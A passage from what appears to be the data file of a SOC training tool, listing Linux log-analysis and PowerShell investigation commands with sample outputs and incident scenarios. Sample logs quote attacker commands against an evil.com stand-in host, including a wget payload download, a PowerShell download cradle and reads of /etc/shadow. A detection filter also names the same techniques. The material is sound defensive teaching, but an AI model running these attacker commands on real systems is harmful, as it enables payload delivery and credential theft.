            "desc": "Find telnet and FTP authentication attempts across logs",
            "scenario": (
                "Telnet and FTP are plaintext protocols — every password is visible on the wire. If they're "
                "still enabled, they're prime targets. This searches across auth.log and syslog for any mention "
                "of telnet or ftp, revealing attempts to use legacy protocols."
            ),
            "output": (
                "/var/log/syslog:Jan 15 14:30:00 server in.telnetd[4000]: connect from 203.0.113.5 (203.0.113.5)\n"
                "/var/log/syslog:Jan 15 14:30:05 server ftpd[4001]: FTP session opened for user anonymous from 198.51.100.42"
            ),
            "simulation": [
                {"from": "grep -E", "to": "auth.log + syslog", "data": "telnet|ftp", "title": "Search both", "desc": "Multiple files at once", "color": "#3498db"},
                {"from": "Terminal", "to": "Analyst", "data": "telnet from IP", "title": "Legacy protocol used", "desc": "High risk — plaintext", "color": "#e74c3c"},
                {"from": "Analyst", "to": "Response", "data": "Disable + block", "title": "Remediate", "desc": "Turn off telnet, use SSH", "color": "#27ae60"}
            ]
        },
        {
            "id": "llog_24",
            "category": "Attack Detection",
            "color": "#f39c12",
            "cmd": "sudo grep 'UFW BLOCK' /var/log/syslog | awk '{print $NF}' | sort | uniq -c | sort -rn | head",
            "desc": "Identify which destination ports are being scanned",
            "scenario": (
                "When a port scanner runs, UFW logs every blocked packet. This command extracts the destination "
                "port (DPT=) from each block, counts them, and shows which ports are targeted most. Many "
                "different ports from one IP = port scan. Repeated hits on one port = targeted attack."
            ),
            "output": (
                " 4521 DPT=22\n"
                " 1203 DPT=3306\n"
                "  892 DPT=80\n"
                "  451 DPT=443"
            ),
            "simulation": [
                {"from": "netfilter", "to": "syslog", "data": "UFW BLOCK DPT=22", "title": "Port logged", "desc": "Each blocked packet", "color": "#e74c3c"},
                {"from": "awk", "to": "Stream", "data": "$NF", "title": "Extract DPT", "desc": "Last field = port", "color": "#f39c12"},
                {"from": "sort | uniq -c", "to": "Ranked ports", "data": "4521 x 22", "title": "Rank", "desc": "Most-targeted port first", "color": "#f39c12"}
            ]
        },
        {
            "id": "llog_25",
            "category": "Attack Detection",
            "color": "#c0392b",
            "cmd": "sudo grep -c 'POSSIBLE BREAK-IN ATTEMPT' /var/log/auth.log",
            "desc": "Count sshd's own break-in warnings",
            "scenario": (
                "When sshd can't reverse-resolve an incoming IP (common with attackers using spoofed or "
                "unregistered IPs), it logs 'POSSIBLE BREAK-IN ATTEMPT!'. A high count means many connections "
                "from IPs without proper reverse DNS — a strong attack indicator."
            ),
            "output": "234",
            "simulation": [
                {"from": "sshd", "to": "auth.log", "data": "reverse mapping failed", "title": "Log warning", "desc": "sshd flags the anomaly", "color": "#f39c12"},
                {"from": "grep -c", "to": "Terminal", "data": "234", "title": "Count", "desc": "Total warnings", "color": "#c0392b"},
                {"from": "Analyst", "to": "Triage", "data": "High count", "title": "Investigate", "desc": "Massive attack indicator", "color": "#e74c3c"}
            ]
        },

        # ============================================================
        # PHYSICAL LOGIN DETECTION
        # ============================================================
        {
            "id": "llog_26",
            "category": "Physical Login Detection",
            "color": "#8e44ad",
            "cmd": "sudo last -F | grep -E 'tty|console'",
            "desc": "Detect physical (local console) logins",
            "scenario": (
                "When someone logs in at the physical console (keyboard + monitor attached to the server), "
                "the session terminal is tty1, tty2, or console — not pts/N (which is a remote SSH session). "
                "If you see a tty login at an unusual time, someone was physically at the server."
            ),
            "output": (
                "root     tty1                          Mon Jan 15 03:00:00 2024   still logged in\n"
                "alice    tty2                          Mon Jan 15 14:24:00 2024 - 14:30:00 2024  (00:06)"
            ),
            "simulation": [
                {"from": "last", "to": "/var/log/wtmp", "data": "Read binary", "title": "Decode wtmp", "desc": "Every login session", "color": "#3498db"},
                {"from": "grep", "to": "Stream", "data": "tty|console", "title": "Filter physical", "desc": "ttyN = local console", "color": "#f39c12"},
                {"from": "Analyst", "to": "Anomaly", "data": "root on tty1 at 3 AM", "title": "Spot", "desc": "Physical access at odd hour", "color": "#8e44ad"}
            ]
        },
        {
            "id": "llog_27",
            "category": "Physical Login Detection",
            "color": "#8e44ad",
            "cmd": "sudo grep 'tty1\\|tty2\\|console' /var/log/auth.log | tail -20",
            "desc": "Show auth events on physical consoles",
            "scenario": (
                "auth.log records physical logins with 'tty1' or 'console' as the terminal. Unlike SSH "
                "(which shows pts/N), these are local sessions. Cross-reference with `last` to confirm. "
                "A physical login during a data center breach is a red flag."
            ),
            "output": (
                "Jan 15 03:00:00 server login[1234]: pam_unix(login:session): session opened for user root by LOGIN(uid=0)\n"
                "Jan 15 03:00:00 server systemd-logind[1]: New session 5 of user root.\n"
                "Jan 15 03:00:00 server login[1234]: ROOT LOGIN on '/dev/tty1'"
            ),
            "simulation": [
                {"from": "login", "to": "auth.log", "data": "ROOT LOGIN on /dev/tty1", "title": "Physical login", "desc": "Console session recorded", "color": "#8e44ad"},
                {"from": "grep", "to": "Stream", "data": "tty1|console", "title": "Filter local", "desc": "Only physical sessions", "color": "#f39c12"},
                {"from": "Analyst", "to": "Anomaly", "data": "3 AM root login", "title": "Investigate", "desc": "Who was at the console?", "color": "#e74c3c"}
            ]
        },
        {
            "id": "llog_28",
            "category": "Physical Login Detection",
            "color": "#8e44ad",
            "cmd": "sudo journalctl -b -1 --no-pager | grep -i 'tty1\\|console' | head -20",
            "desc": "Check physical logins from the previous boot",
            "scenario": (
                "If an attacker logged in physically and then rebooted (or crashed the system), their session "
                "is in the previous boot's journal. journalctl -b -1 reads the previous boot only. This is how "
                "you investigate 'what happened before the reboot?'."
            ),
            "output": (
                "Jan 15 03:00:00 server login[1234]: ROOT LOGIN on '/dev/tty1'\n"
                "Jan 15 03:15:00 server systemd[1]: Starting Reboot...\n"
                "Jan 15 03:15:05 server systemd[1]: Shutting down."
            ),
            "simulation": [
                {"from": "journalctl", "to": "journald", "data": "-b -1", "title": "Previous boot", "desc": "Only last boot's entries", "color": "#3498db"},
                {"from": "grep", "to": "Stream", "data": "tty1|console", "title": "Filter physical", "desc": "Console logins only", "color": "#f39c12"},
                {"from": "Analyst", "to": "Timeline", "data": "Login then reboot", "title": "Reconstruct", "desc": "Attacker covered tracks?", "color": "#8e44ad"}
            ]
        },

        # ============================================================
        # LOG MONITORING & FORWARDING
        # ============================================================
        {
            "id": "llog_29",
            "category": "Log Monitoring & Forwarding",
            "color": "#16a085",
            "cmd": "sudo tail -f /var/log/auth.log /var/log/syslog /var/log/ufw.log",
            "desc": "Watch three critical logs at once",
            "scenario": (
                "During an active incident, you need auth (who's logging in), syslog (what's breaking), and "
                "ufw (what's being blocked) simultaneously. `tail -f` accepts multiple files and prints each "
                "line with a header indicating the source file. Instant multi-log view."
            ),
            "output": (
                "==> /var/log/auth.log <==\n"
                "Jan 15 14:23:45 server sshd[1234]: Failed password for admin from 203.0.113.5\n"
                "==> /var/log/syslog <==\n"
                "Jan 15 14:23:45 server kernel: [UFW BLOCK] SRC=203.0.113.5 DPT=22\n"
                "==> /var/log/ufw.log <==\n"
                "Jan 15 14:23:45 server kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.5 DPT=22"
            ),
            "simulation": [
                {"from": "tail -f", "to": "auth.log", "data": "Failed password", "title": "Auth events", "desc": "Login attempts", "color": "#e74c3c"},
                {"from": "tail -f", "to": "syslog", "data": "UFW BLOCK", "title": "System events", "desc": "Kernel + services", "color": "#3498db"},
                {"from": "tail -f", "to": "ufw.log", "data": "BLOCK entry", "title": "Firewall events", "desc": "Every drop logged", "color": "#f39c12"}
            ]
        },
        {
            "id": "llog_30",
            "category": "Log Monitoring & Forwarding",
            "color": "#16a085",
            "cmd": "sudo fail2ban-client status sshd",
            "desc": "Check fail2ban jail status — who's banned right now",
            "scenario": (
                "fail2ban watches auth.log for repeated failures and adds UFW rules to ban the source IPs. "
                "This command shows the SSH jail: current failed count, total bans, currently banned IPs. "
                "It's your automated defense dashboard."
            ),
            "output": (
                "Status for the jail: sshd\n"
                "|- Filter\n"
                "|  |- Currently failed: 2\n"
                "|  |  - Total failed:   847\n"
                "|  `- File list:        /var/log/auth.log\n"
                "`- Actions\n"
                "   |- Currently banned: 3\n"
                "   |- Total banned:     12\n"
                "   `- Banned IP list:   203.0.113.5 198.51.100.42 192.0.2.77"
            ),
            "simulation": [
                {"from": "fail2ban", "to": "auth.log", "data": "Failed password", "title": "Watch log", "desc": "Reads new lines live", "color": "#3498db"},
                {"from": "fail2ban", "to": "ufw", "data": "ufw deny from IP", "title": "Trigger ban", "desc": "Adds temporary firewall rule", "color": "#e74c3c"},
                {"from": "fail2ban-client", "to": "Terminal", "data": "3 banned", "title": "Status", "desc": "Current jail state", "color": "#16a085"}
            ]
        },
        {
            "id": "llog_31",
            "category": "Log Monitoring & Forwarding",
            "color": "#9b59b6",
            "cmd": "sudo ausearch -k exec_commands -ui root | tail -30",
            "desc": "Query auditd for every command executed as root",
            "scenario": (
                "auditd hooks into the kernel and records every execve() syscall. Unlike shell history (which "
                "attackers can erase), auditd logs are kernel-generated and tamper-evident. This query shows "
                "every command run as UID 0 — the complete root action trail."
            ),
            "output": (
                "type=EXECVE msg=audit(1705329312.456:1234): argc=3 a0=\"cat\" a1=\"/etc/shadow\"\n"
                "type=EXECVE msg=audit(1705329312.789:1235): argc=4 a0=\"wget\" a1=\"http://evil.com/payload\" a2=\"-O\" a3=\"/tmp/p\"\n"
                "type=EXECVE msg=audit(1705329313.012:1236): argc=2 a0=\"chmod\" a1=\"+x\" a2=\"/tmp/p\""
            ),
            "simulation": [
                {"from": "Kernel", "to": "auditd", "data": "execve() syscall", "title": "Hook fires", "desc": "Every command captured", "color": "#3498db"},
                {"from": "auditd", "to": "audit.log", "data": "EXECVE event", "title": "Write log", "desc": "Immutable kernel record", "color": "#f39c12"},
                {"from": "ausearch", "to": "Terminal", "data": "Full command line", "title": "Query", "desc": "Who ran what, when", "color": "#9b59b6"}
            ]
        }
    ],
    "scenarios": [
        {
            "id": "llogs_sc_1",
            "title": "SSH Brute Force — Detect & Block",
            "icon": "🔨",
            "color": "#e74c3c",
            "situation": "Thousands of failed SSH logins are hitting your server from one IP.",
            "detection_cmd": "sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",
            "detection_output": "  642 203.0.113.5\n   58 198.51.100.42",
            "analysis": "642 failures from one IP in under an hour = automated brute force. Normal is 0-2 per day.",
            "response_cmds": [
                "sudo ufw deny from 203.0.113.5",
                "sudo ufw limit ssh",
                "sudo grep 'Accepted' /var/log/auth.log | grep 203.0.113.5"
            ],
            "post_action": "Attacker blocked at the firewall. SSH rate limit prevents future automated attempts. Final grep confirms no login ever succeeded from that IP."
        },
        {
            "id": "llogs_sc_2",
            "title": "Physical Console Login at 3 AM",
            "icon": "🖥️",
            "color": "#8e44ad",
            "situation": "Someone logged in at the physical console of your data-center server at 3 AM.",
            "detection_cmd": "sudo last -F | grep -E 'tty|console'",
            "detection_output": "root     tty1                          Mon Jan 15 03:00:00 2024   still logged in",
            "analysis": "tty1 = physical console, not SSH. A root login at 3 AM on the physical console is either emergency maintenance or unauthorized physical access. Cross-reference with change tickets and CCTV.",
            "response_cmds": [
                "sudo grep 'tty1\\|console' /var/log/auth.log | tail -20",
                "sudo journalctl -b -1 --no-pager | grep -i 'tty1\\|console'",
                "sudo lastlog | grep root"
            ],
            "post_action": "If not authorized: escalate to physical security, preserve logs, consider full compromise. If authorized: document the change window."
        },
        {
            "id": "llogs_sc_3",
            "title": "Port Scan via UFW Block Logs",
            "icon": "🔍",
            "color": "#f39c12",
            "situation": "A scanner is probing every port on your server.",
            "detection_cmd": "sudo grep 'UFW BLOCK' /var/log/syslog | awk '{print $13}' | sort | uniq -c | sort -rn | head",
            "detection_output": " 4521 203.0.113.5\n  234 198.51.100.42",
            "analysis": "One IP triggered 4,521 blocked packets in the last hour — clearly a port scanner (T1046 in MITRE ATT&CK).",
            "response_cmds": [
                "sudo ufw deny from 203.0.113.5",
                "sudo grep 'UFW BLOCK' /var/log/syslog | awk '{print $NF}' | sort | uniq -c | sort -rn | head",
                "sudo tail -f /var/log/ufw.log | grep '203.0.113.5'"
            ],
            "post_action": "Scanner blocked. The DPT ranking reveals which of your ports were targeted most — prioritize patching those services."
        },
        {
            "id": "llogs_sc_4",
            "title": "Privilege Escalation via Sudo Logs",
            "icon": "⬆️",
            "color": "#c0392b",
            "situation": "A user's sudo session shows commands that don't match their normal role.",
            "detection_cmd": "sudo grep 'sudo:' /var/log/auth.log | grep 'COMMAND=' | tail -20",
            "detection_output": "alice : COMMAND=/bin/cat /etc/shadow\nalice : COMMAND=/usr/bin/wget http://evil.com/payload -O /tmp/p\nalice : COMMAND=/bin/chmod +x /tmp/p",
            "analysis": "Reading /etc/shadow + downloading a binary + chmod +x = classic attacker pattern. Alice's account is either compromised or she's gone rogue.",
            "response_cmds": [
                "sudo usermod -L alice",
                "sudo kill -9 $(pgrep -u alice)",
                "sudo find /tmp -name 'p' -delete",
                "sudo ausearch -k exec_commands -ui alice | tail -30"
            ],
            "post_action": "Account locked, processes killed, payload deleted. auditd confirms the full command history. Notify HR and start incident response."
        }
    ],
    "extra": {}
}

# ==================== MODULE: POWERSHELL FOR SOC ====================
# ==================== MODULE: POWERSHELL FOR SOC ====================
POWERSHELL_COMMANDS = [
    # ============================================================
    # FUNDAMENTALS
    # ============================================================
    {"id": "ps_1", "category": "Fundamentals", "color": "#3498db",
     "cmd": "Get-Help Get-Process",
     "desc": "Read the built-in help for any cmdlet",
     "scenario": "You've forgotten what a cmdlet's parameters are. Get-Help shows syntax, description, examples, and related commands. Use -Examples to jump straight to real examples.",
     "output": "NAME\n    Get-Process\n\nSYNOPSIS\n    Gets the processes that are running on the local computer.\n\nSYNTAX\n    Get-Process [[-Name] <String[]>] [-Module] [-FileVersionInfo] ...\n\nEXAMPLES\n    Get-Process    # List all processes\n    Get-Process -Name pwsh  # Specific process",
     "simulation": [
         {"from": "You", "to": "Get-Help", "data": "Get-Process", "title": "Request help", "desc": "PowerShell looks up the cmdlet metadata", "color": "#3498db"},
         {"from": "Get-Help", "to": "Terminal", "data": "Syntax + Examples", "title": "Render help", "desc": "Full help text displayed", "color": "#27ae60"}
     ]},
    {"id": "ps_2", "category": "Fundamentals", "color": "#3498db",
     "cmd": "Get-Command -Noun Process",
     "desc": "Discover all cmdlets that operate on processes",
     "scenario": "You know there's a way to stop a process but can't remember the exact cmdlet. Get-Command -Noun searches all available cmdlets by noun. It reveals Get-Process, Stop-Process, Start-Process, and more.",
     "output": "CommandType     Name           Version    Source\n-----------     ----           -------    ------\nCmdlet          Get-Process    3.1.0.0    Microsoft.PowerShell.Management\nCmdlet          Start-Process  3.1.0.0    Microsoft.PowerShell.Management\nCmdlet          Stop-Process   3.1.0.0    Microsoft.PowerShell.Management\nCmdlet          Wait-Process   3.1.0.0    Microsoft.PowerShell.Management",
     "simulation": [
         {"from": "You", "to": "Get-Command", "data": "-Noun Process", "title": "Query", "desc": "Search all cmdlets by noun", "color": "#3498db"},
         {"from": "Get-Command", "to": "Terminal", "data": "4 cmdlets found", "title": "List", "desc": "All Process-related cmdlets", "color": "#27ae60"}
     ]},
    {"id": "ps_3", "category": "Fundamentals", "color": "#9b59b6",
     "cmd": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, Id, CPU, Path",
     "desc": "Top 20 processes by CPU usage with full path",
     "scenario": "A user reports the machine is slow. This shows the top CPU consumers. The Path column is the key detail — if a process runs from C:\\Users\\Public or C:\\Temp, that's a strong indicator of malware.",
     "output": "Name           Id      CPU Path\n----           --      --- ----\nchrome       1234   245.32 C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\npowershell   5678   178.90 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nsvchost      4321    92.10 C:\\Windows\\System32\\svchost.exe",
     "simulation": [
         {"from": "Get-Process", "to": "Pipeline", "data": "All processes", "title": "Get all", "desc": "Every running process with CPU data", "color": "#3498db"},
         {"from": "Sort-Object", "to": "Pipeline", "data": "CPU descending", "title": "Sort", "desc": "Highest CPU first", "color": "#f39c12"},
         {"from": "Select-Object", "to": "Terminal", "data": "Top 20", "title": "Trim + format", "desc": "Only 20 rows, only 4 columns", "color": "#27ae60"}
     ]},
    {"id": "ps_4", "category": "Fundamentals", "color": "#9b59b6",
     "cmd": "Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine | Format-List",
     "desc": "See the full command line of every running process",
     "scenario": "Get-Process does NOT show command-line arguments by default. WMI does. If you see powershell.exe -enc SQBFAFgA... or cmd.exe /c whoami, those are the exact flags attackers use. This is your #1 command for detecting malicious execution.",
     "output": "ProcessId   : 5678\nName        : powershell.exe\nCommandLine : powershell.exe -EncodedCommand SQBFAFgA...\n\nProcessId   : 4321\nName        : cmd.exe\nCommandLine : cmd.exe /c whoami /all",
     "simulation": [
         {"from": "Get-CimInstance", "to": "WMI", "data": "Win32_Process", "title": "Query WMI", "desc": "Full process metadata including args", "color": "#3498db"},
         {"from": "WMI", "to": "Pipeline", "data": "All processes", "title": "Return", "desc": "Every process with CommandLine", "color": "#f39c12"},
         {"from": "Select-Object", "to": "Terminal", "data": "PID, Name, CmdLine", "title": "Trim", "desc": "Only the useful columns", "color": "#27ae60"}
     ]},
    {"id": "ps_5", "category": "Fundamentals", "color": "#9b59b6",
     "cmd": "Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name, CommandLine | Sort-Object ParentProcessId",
     "desc": "Show parent-child process relationships — detect attack chains",
     "scenario": "Why does excel.exe spawning cmd.exe matter? Because normal users don't do that. Attackers use Office macros to spawn cmd → powershell. This command reveals the full parent-child tree. Look for processes with parents that shouldn't spawn shells.",
     "output": "ProcessId ParentProcessId Name           CommandLine\n--------- --------------- ----           -----------\n1234      4321            cmd.exe        cmd.exe /c powershell -enc ...\n5678      1234            powershell.exe powershell.exe -enc SQBFAFgA...",
     "simulation": [
         {"from": "WMI", "to": "Pipeline", "data": "All processes", "title": "Get processes", "desc": "Every process with parent PID", "color": "#3498db"},
         {"from": "Sort-Object", "to": "Pipeline", "data": "By ParentPID", "title": "Group", "desc": "Same parent clustered together", "color": "#f39c12"},
         {"from": "Terminal", "to": "Analyst", "data": "excel → cmd → PS", "title": "Spot chain", "desc": "Suspicious parent-child sequence", "color": "#e74c3c"}
     ]},

    # ============================================================
    # EVENT LOG ANALYSIS
    # ============================================================
    {"id": "ps_6", "category": "Event Log Analysis", "color": "#e74c3c",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 20",
     "desc": "List the 20 most recent failed logons (Event ID 4625)",
     "scenario": "You suspect brute force. Event 4625 is written every time authentication fails. Filtering by log and ID via FilterHashtable is fast — PowerShell asks the OS for only matching events instead of loading everything. Pipe to Group-Object to count failures per IP.",
     "output": "TimeCreated          Id Message\n-----------          -- -------\n1/15/2024 2:23 PM  4625 An account failed to log on. (admin / 203.0.113.5)\n1/15/2024 2:23 PM  4625 An account failed to log on. (admin / 203.0.113.5)\n1/15/2024 2:24 PM  4625 An account failed to log on. (root / 203.0.113.5)",
     "simulation": [
         {"from": "Get-WinEvent", "to": "Security channel", "data": "Filter ID=4625", "title": "Query", "desc": "FilterHashtable is fast + structured", "color": "#e74c3c"},
         {"from": "Channel", "to": "Pipeline", "data": "20 events", "title": "Return", "desc": "Newest 20 matching events", "color": "#f39c12"},
         {"from": "Pipeline", "to": "Terminal", "data": "Time, ID, Message", "title": "Display", "desc": "Human-readable output", "color": "#27ae60"}
     ]},
    {"id": "ps_7", "category": "Event Log Analysis", "color": "#e74c3c",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} | Group-Object -Property {$_.Properties[5].Value} | Sort-Object Count -Descending | Select-Object -First 10",
     "desc": "Rank failed logons by source IP — top 10 brute force sources",
     "scenario": "The classic SOC triage pattern. Pull all 4625 events, group them by source IP (Properties[5]), sort by count descending. The IP at the top is your attacker. 600+ failures from one IP = automated brute force.",
     "output": "Count Name\n----- ----\n 4521 203.0.113.5\n  234 198.51.100.42\n   89 192.0.2.77",
     "simulation": [
         {"from": "Get-WinEvent", "to": "Pipeline", "data": "All 4625 events", "title": "Pull", "desc": "Every failed logon", "color": "#3498db"},
         {"from": "Group-Object", "to": "Pipeline", "data": "By source IP", "title": "Count", "desc": "One row per attacking IP", "color": "#f39c12"},
         {"from": "Sort-Object", "to": "Terminal", "data": "Top 10", "title": "Rank", "desc": "Biggest attacker first", "color": "#e74c3c"}
     ]},
    {"id": "ps_8", "category": "Event Log Analysis", "color": "#e74c3c",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -MaxEvents 50 | Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='LogonType';E={$_.Properties[8].Value}}, @{N='SourceIP';E={$_.Properties[18].Value}}",
     "desc": "Audit successful logons with user, logon type, and source IP",
     "scenario": "Event 4624 fires on every successful login. Adding calculated properties (Properties[5]=user, Properties[8]=logon type, Properties[18]=source IP) makes it readable. LogonType 10 = RDP, Type 3 = network, Type 2 = interactive. A Type 10 from an unusual IP = lateral movement or remote intrusion.",
     "output": "TimeCreated        User   LogonType SourceIP\n-----------        ----   --------- ---------\n1/15/2024 2:23 PM  alice 3         192.168.1.50\n1/15/2024 2:25 PM  bob   10        203.0.113.5",
     "simulation": [
         {"from": "Get-WinEvent", "to": "Pipeline", "data": "4624 events", "title": "Query", "desc": "Successful logons only", "color": "#3498db"},
         {"from": "Select-Object", "to": "Pipeline", "data": "Extract fields", "title": "Format", "desc": "Calc properties make fields readable", "color": "#f39c12"},
         {"from": "Terminal", "to": "Analyst", "data": "Type 10 from WAN", "title": "Spot anomaly", "desc": "RDP from public IP = suspicious", "color": "#e74c3c"}
     ]},
    {"id": "ps_9", "category": "Event Log Analysis", "color": "#9b59b6",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';ID=4104} | Where-Object {$_.Message -match 'EncodedCommand|FromBase64String|IEX|DownloadString'}",
     "desc": "Detect malicious PowerShell via script block logging",
     "scenario": "Event 4104 captures the deobfuscated script block of every PowerShell command. Filtering for IEX (Invoke-Expression), DownloadString, EncodedCommand, and FromBase64String surfaces the classic download cradle pattern. This is the single most useful event for PowerShell attack detection.",
     "output": "TimeCreated        Message\n-----------        -------\n1/15/2024 2:25 PM  IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\n1/15/2024 2:26 PM  powershell.exe -EncodedCommand SQBFAFgA...",
     "simulation": [
         {"from": "Get-WinEvent", "to": "PS/Operational", "data": "ID=4104", "title": "Query", "desc": "All PowerShell script blocks", "color": "#3498db"},
         {"from": "Where-Object", "to": "Pipeline", "data": "IEX|DownloadString", "title": "Filter", "desc": "Classic malicious patterns", "color": "#f39c12"},
         {"from": "Terminal", "to": "Alert", "data": "Download cradle", "title": "Detect", "desc": "Attacker fetches + runs remote code", "color": "#e74c3c"}
     ]},
    {"id": "ps_10", "category": "Event Log Analysis", "color": "#c0392b",
     "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=1102}",
     "desc": "Detect Security log cleared — always suspicious",
     "scenario": "Event 1102 fires whenever the Security event log is cleared. There is NO legitimate reason for this in a production environment. If you see it, treat it as an active incident. Attackers clear logs to hide their tracks.",
     "output": "TimeCreated          Id Message\n-----------          -- -------\n1/15/2024 3:00 PM  1102 The audit log was cleared. Subject: alice",
     "simulation": [
         {"from": "Attacker", "to": "Security log", "data": "wevtutil cl Security", "title": "Clear log", "desc": "Attacker wipes audit trail", "color": "#e74c3c"},
         {"from": "Windows", "to": "Event 1102", "data": "Log cleared", "title": "Log the wipe", "desc": "The clearing itself is logged", "color": "#f39c12"},
         {"from": "Get-WinEvent", "to": "Analyst", "data": "1102 found", "title": "Alert", "desc": "Always investigate", "color": "#c0392b"}
     ]},

    # ============================================================
    # NETWORK INVESTIGATION
    # ============================================================
    {"id": "ps_11", "category": "Network Investigation", "color": "#16a085",
     "cmd": "Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess | Sort-Object RemoteAddress",
     "desc": "List every established TCP connection with owning PID",
     "scenario": "An endpoint reaching out to a C2 server? Beaconing to a suspicious IP? This shows every active TCP connection with the PID of the process that owns it. Cross-reference the OwningProcess PID with Get-Process to see which program is talking to that IP.",
     "output": "LocalAddress  LocalPort RemoteAddress RemotePort OwningProcess\n------------  --------- ------------- ---------- -------------\n192.168.1.10  54321     203.0.113.5   443        1234\n192.168.1.10  54322     142.250.185.78 443       5678",
     "simulation": [
         {"from": "Get-NetTCPConnection", "to": "TCP stack", "data": "All connections", "title": "Query", "desc": "Every TCP connection", "color": "#3498db"},
         {"from": "Filter", "to": "Pipeline", "data": "State = Established", "title": "Filter", "desc": "Only live sessions", "color": "#f39c12"},
         {"from": "Terminal", "to": "Analyst", "data": "PID + DestIP", "title": "Attribute", "desc": "Which process to which IP", "color": "#16a085"}
     ]},
    {"id": "ps_12", "category": "Network Investigation", "color": "#16a085",
     "cmd": "Get-NetTCPConnection -State Established | Where-Object {$_.RemoteAddress -notmatch '^(127\\.|10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[0-1])\\.)'} | ForEach-Object { $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue; [PSCustomObject]@{RemoteAddress=$_.RemoteAddress; RemotePort=$_.RemotePort; Process=$proc.Name; PID=$_.OwningProcess} }",
     "desc": "Map established connections to process names — external IPs only",
     "scenario": "The previous command gives you PIDs but not names. This one resolves the PID to a process name AND filters out LAN/loopback IPs. rundll32.exe connecting to 185.234.x.x? That's not normal. svchost.exe connecting to Microsoft IPs? That's fine. This is how you spot C2 traffic.",
     "output": "RemoteAddress  RemotePort Process       PID\n-------------  ---------- -------       ---\n203.0.113.5    443        powershell.exe 5678\n198.51.100.42  8080       rundll32.exe  9012",
     "simulation": [
         {"from": "Get-NetTCPConnection", "to": "Pipeline", "data": "Established", "title": "Get connections", "desc": "All live sessions", "color": "#3498db"},
         {"from": "Where-Object", "to": "Pipeline", "data": "Not LAN/loopback", "title": "Filter external", "desc": "Skip internal traffic", "color": "#f39c12"},
         {"from": "ForEach-Object", "to": "Terminal", "data": "PID → ProcessName", "title": "Resolve", "desc": "Human-readable attribution", "color": "#e74c3c"}
     ]},
    {"id": "ps_13", "category": "Network Investigation", "color": "#16a085",
     "cmd": "Get-DnsClientCache | Select-Object Entry, Data",
     "desc": "Show recently resolved DNS names — spot C2 domains",
     "scenario": "The DNS cache shows every domain this machine recently resolved. Legitimate domains are mixed in with attacker-controlled ones. Look for DGA (random character) domains, weird TLDs (.top, .xyz, .pw), or known C2 infrastructure. Great for finding beaconing before you see network traffic.",
     "output": "Entry                    Data\n-----                    ----\nwww.google.com           142.250.185.78\nevil-c2.xyz              185.234.72.11\napi.github.com            140.82.113.6",
     "simulation": [
         {"from": "Windows", "to": "DNS cache", "data": "Recent lookups", "title": "Cache", "desc": "Every domain resolved recently", "color": "#3498db"},
         {"from": "Get-DnsClientCache", "to": "Pipeline", "data": "Entry + Data", "title": "Extract", "desc": "Domain + resolved IP", "color": "#f39c12"},
         {"from": "Analyst", "to": "IOC", "data": "evil-c2.xyz", "title": "Spot C2", "desc": "DGA domain = malware", "color": "#e74c3c"}
     ]},

    # ============================================================
    # FILE HASHING
    # ============================================================
    {"id": "ps_14", "category": "File Hashing", "color": "#f39c12",
     "cmd": "Get-FileHash -Path 'C:\\Users\\Public\\update.exe' -Algorithm SHA256",
     "desc": "Hash a suspicious file for IOC lookup",
     "scenario": "You found a file in C:\\Users\\Public. Before doing anything else, hash it. Paste the SHA256 into VirusTotal, your SIEM, or your threat intel platform. 5 seconds tells you if it's known malware.",
     "output": "Algorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nSHA256          A3F5C8B2D1E4F7A9...                                                   C:\\Users\\Public\\update.exe",
     "simulation": [
         {"from": "Get-FileHash", "to": "File", "data": "Read bytes", "title": "Read file", "desc": "Streams file through SHA256", "color": "#3498db"},
         {"from": "File", "to": "Pipeline", "data": "A3F5C8...", "title": "Compute hash", "desc": "32-byte fingerprint", "color": "#f39c12"},
         {"from": "Analyst", "to": "VirusTotal", "data": "SHA256 lookup", "title": "IOC match", "desc": "Known malware or clean?", "color": "#e74c3c"}
     ]},
    {"id": "ps_15", "category": "File Hashing", "color": "#f39c12",
     "cmd": "Get-ChildItem -Path 'C:\\Users\\Public' -Filter *.exe -Recurse | Get-FileHash -Algorithm SHA256",
     "desc": "Hash every .exe in a suspicious directory",
     "scenario": "Attackers often drop multiple tools in the same folder. Instead of hashing one file at a time, hash every .exe in the directory at once. Export the results to CSV and check all hashes against your IOC list.",
     "output": "Algorithm Hash                              Path\n--------- ----                              ----\nSHA256    A3F5...                           C:\\Users\\Public\\update.exe\nSHA256    B7E2...                           C:\\Users\\Public\\mimikatz.exe\nSHA256    C9D4...                           C:\\Users\\Public\\psexec.exe",
     "simulation": [
         {"from": "Get-ChildItem", "to": "Directory", "data": "*.exe", "title": "List files", "desc": "Every .exe in the folder", "color": "#3498db"},
         {"from": "Get-FileHash", "to": "Pipeline", "data": "Hash each", "title": "Hash all", "desc": "SHA256 for every file", "color": "#f39c12"},
         {"from": "Terminal", "to": "Analyst", "data": "3 hashes", "title": "IOC check", "desc": "Check each against intel", "color": "#e74c3c"}
     ]},
    {"id": "ps_16", "category": "File Hashing", "color": "#f39c12",
     "cmd": "Get-AuthenticodeSignature -FilePath 'C:\\Users\\Public\\update.exe'",
     "desc": "Check if an executable is digitally signed by a trusted publisher",
     "scenario": "Legitimate Windows executables are signed by Microsoft or other trusted vendors. If a file is NotSigned or the signature is Invalid/HashMismatch, it's either unsigned malware or has been tampered with. Another quick triage step.",
